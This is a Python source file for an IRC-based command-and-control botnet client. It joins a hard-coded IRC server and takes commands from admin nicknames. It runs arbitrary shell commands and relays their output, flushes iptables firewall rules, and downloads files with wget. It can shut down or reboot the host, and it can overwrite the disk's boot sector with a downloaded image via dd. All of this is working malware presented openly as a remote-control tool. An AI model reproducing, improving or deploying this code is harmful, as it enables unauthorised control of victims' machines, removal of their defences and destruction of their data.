#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

#to do list
#make more cross-platform instead of just for linux - windows, mac, sun, etc.
#handle reconnecting if server restarts or there is some connection error
#figure out how to disconnect from server and disconnect from channel

import socket
import ftplib
import urllib2
import urllib
import sys
# import ctypes
import random
import time
import platform
import os
import subprocess as sub
from sys import argv
from random import randint

def generateNick(os): #generates a nick for the server
	rannum = str(randint(0, 9999))
	return str(os[:3] + rannum)

def execute(cmd): #execute shell commands
	isItLs = 0
	if "ls" in cmd:
		cmd += " -pA"
		isItLs = 1

	#handling a multi-word command
	cmdList = []
	if (cmd.find(" ") != -1):
		cmdList = cmd.split(" ")
		
		try:#checking for syntax errors
			p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
			output, errors = p.communicate()
		
		except:#if there was some sytax error, spit back an error
			print "An error has occured.\n"
			return "An error has occured. Probably invalid command or syntax."

	#handles a 1-liner
	else:
		try:#checking for syntax errors
			p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
			output, errors = p.communicate()

		except:
			print "An error has occured.\n"
			return "An error has occured. Probably invalid command or syntax."
	
	if len(output) < 1:
		return errors

	#handling multi-line output
	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
	if len(lines) > 1: #if there was a new line found, return array
		if isItLs: #doing all the directory stuff
			dirs = "dirs: "
			files = "files: "
			for line in lines:
				if line[-1] == "/":
					dirs += "'" + line + "'   "
				else:
					files += "'" + line + "'   "
			lines = [dirs.strip(), files.strip()]

		for element in lines: #check if a line is JUST a newline
			if element == "":
				lines[lines.index(element)] = "~" #replace newline with a ~

		return lines
	
	return output

#actually sending the data
def sendData(data): #send text back to the irc server
	#sending multiple lines if it's a list
	if type(data) is list:
		for line in data:
			irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
	else: #sending a one-liner back
		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')

#All of the possible functions that the botnet is capable of
def reply(): #send back to IRC server that you are here
	sendData("Yes I am here")

def whoAmI(): #execute whoami command and send output
	output  = execute("whoami")
	sendData(output)

def iAmGood(): #send back to IRC server that you are good
	sendData("I am good. And you?")

def runAndSend(cmd): #take a single command, run it, return output
	request = execute(cmd)
	sendData(request)

def getAge(): #send uptime
	sendData("I don't know how to do that yet boss.")

def terminate(): #terminate program and send goodbye message
	sendData("Oh no! We better find some cover.")
	irc.close()
	exit()

def freeSpace(): #tells how much free space there is
	request = execute("df")
	sendData(request)

def uptime(): #total uptime on the server
	request = execute("uptime")
	sendData(request)

def version(): #which kernel version
	sendData(platform.release())

def getIP(): #gets the public IP address
	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
	sendData(my_ip)

def flushFirewall(): #flushes the firewall rules
	if (os == "linux"):
		request = execute("/usr/bin/env iptables -F") #flushing rules
		sendData("Firewall rules have been flushed.")

def checkFirewall(): #reports current firewall config
	if (os == "linux"):
		sendData("Current Firewall Rules:")
		request = execute("/usr/bin/env iptables -L -n")
		sendData(request)
	elif (os == "windows"):
		sendData("idk how to windows yet boss.")
	elif (os == "darwin"):
		sendData("idk how to mac yet boss.")
	else:
		sendData("unknown")

def download(cmd): #file downloader
	if (os == "linux"):
		if (cmd.count(" ") != 1): #make sure there is only 1 space
			sendData("Usage: download [file] [dir]")
		else:
			args = cmd.split(" ")
			download = "wget --no-check-certificate -q -P " + args[1] + " " + args[0]
			
			request = execute(download) #executing the download
			sendData("Download executed.")

def nyanmbr(): #download nyancat.mbr and over bootloader with it
	if (os == "linux" or os == "darwin"):
		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
		execute("rm -rf /tmp/nyan.mbr")

def nap(): #shutdown the computer
	execute("init 0")

def reboot(): #reboot the computer
	execute("init 6")

def persist(): #try to persist bot
	sendData("I don't know how to do that yet boss.")

#debugger
DEBUG = 0
if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
	DEBUG = 1

#other vars
os = platform.system().lower() #detected os in all lowercase
INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
					#index two is the boolean for if the interactive shell is with this bot
DISCONNECED = 1 	#if we are disconnected, this is true

#IRC Settings
admins = ["king", "samorizu", "blackbear", "bigshebang"]
server = "leagueachieve.info"
port = 6667
channel = "#lobby"
nick = generateNick(os)

print "The botnick is: '%s'" % nick

#dictionary of functions
commands = {
	"are you there" : reply,
	"how are you" : iAmGood,
	"who are you" : whoAmI,
	"how old are you" : getAge,
	"zombie apocalypse" : terminate,
	"free" : freeSpace,
	"uptime" : uptime,
	"version" : version,
	"what is your ip" : getIP,
	"where are you" : getIP,
	"flush firewall" : flushFirewall,
	"firewall" : checkFirewall,
	"download" : download,
	"nyanmbr" : nyanmbr,
	"take a nap": nap,
	"reboot" : reboot,
	"persist" : persist
}

#function which parses the command and determines how to handle it
def parseCommand(command):
	if DEBUG:
		print "command is '%s'" % command
		print "interact 0: " + str(not INTERACT[0])
		print "interact 1: " + str(not INTERACT[1])

	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
		lines = command.split("\n")
		if len(lines) > 2:
			print "we got a bunch of lines...doing nothing"
			return

		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
		if ":" in header: #check if there is a colon first, to avoid crashing
			header = header[(header.index(":") + 1):] #get all after colon

		user = header[:header.index("!~")] #user sending message
		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
		hostname = host[:host.index("@")] #hostname: 'blarg'
		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'

		if DEBUG:
			print "user is '%s'" % user
			print "host is '%s'" % host
			print "hostname is '%s'" % hostname
			print "client is '%s'" % client

		if user in admins: #check if sender is an approved controller
			tempCommand = command[command.index("PRIVMSG"):]
			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()

			print "Recieved '%s' from the CNC" % command #print command

			if INTERACT[0]: #if interactive shell is on
				if "??finish" == command[:8]:
					INTERACT[0] = 0
					return
				elif "??-" == command[:3]:
					users = command[3:].split(" ")
					if nick in users or "all" in users:
						INTERACT[1] = 0

					return
				elif "??+" == command[:3]:
					return

				if len(command) > 0:
					sendData("I would have performed: '" + command + "'")
			elif "??" == command[:2]: #if '??' is given
				INTERACT[0] = 1
				users = command[2:].split(" ")

				if DEBUG:
					print "command is '%s'" % command
				for user in users:
					print "user is '%s'" % user

				if not nick in users and not "all" in users:
					INTERACT[1] = 0
					return
			elif "?!" == command[:2]: #if they want to single out one or more bots to run a function
				if ":" in command:
					lines = command[2:].split(":")
				else:
					print "incorrect syntax. you need a ':'"
					return

				users = lines[0].split(" ")
				if nick in users or "all" in users:
					lines[1] = lines[1].strip()
					if lines[1] in commands.keys(): #if regular command
						commands[lines[1]]() #call appropriate function
						print "function called"
			else:
				if command in commands.keys(): #if regular command
					commands[command]() #call appropriate function
					print "function called"
				elif command[:7] == "execute": #if they want the execute command, make that work
					runAndSend(command[8:])
				elif command[:8] == "download":
					download(command[9:])
				else: #if not recognized
					print "command '%s' not defined" % command
		else:
			print "user '%s' not in list of admins" % user

	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
		if "PRIVMSG" in command:
			command = command[command.index("PRIVMSG"):]
			command = command[(command.index(':') + 1):].strip().lower()
			if "??finish" == command[:8]:
				INTERACT[0] = 0
				INTERACT[1] = 1
			elif "??+" == command[:3]:
				users = command[3:].split(" ")
				if nick in users or "all" in users:
					INTERACT[1] = 1

#code to connect to an IRC server
def connectToServer(nick):
	print "connecting to:", server

	connected = 0
	while not connected:
		try:
			irc.connect((server, port)) #connects to the server
			connected = 1
		except:
			connected = 0
			time.sleep(5)

	irc.send("USER " + nick + " " + nick + " " + nick + " :This is a fun bot!\n") #user authentication
	irc.send("NICK " + nick + "\n") #sets nick

	temp = irc.recv(1024) #get response to setting nick
	if DEBUG:
		print "text received: '%s'" % temp

	counter = 2
	while "nickname already in use" in temp.lower():
		nick = nick + "-" + str(counter)
		if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
			nick = generateNick(os)
			counter = 2
		irc.send("NICK " + nick + "\n") #sets nick
		temp=irc.recv(1024) #get response to setting nick
		if DEBUG:
			print "text received: '%s'\niteration %d" % (temp, counter)
		counter += 1

	irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
	irc.send("JOIN " + channel + "\n") #join the channel

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
connectToServer(nick) #connect to IRC server

#infinite loop to listen for messages aka commands
while 1:
	text = irc.recv(1024) #receive up to 1024 bytes
	while len(text) < 1: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
		irc.close()
		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
		connectToServer(nick)
		time.sleep(5)
		text = irc.recv(1024) #receive up to 1024 bytes

	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
	if text.find('PING') != -1: #check if 'PING' is found
		irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

	parseCommand(text) #call function to parse commands
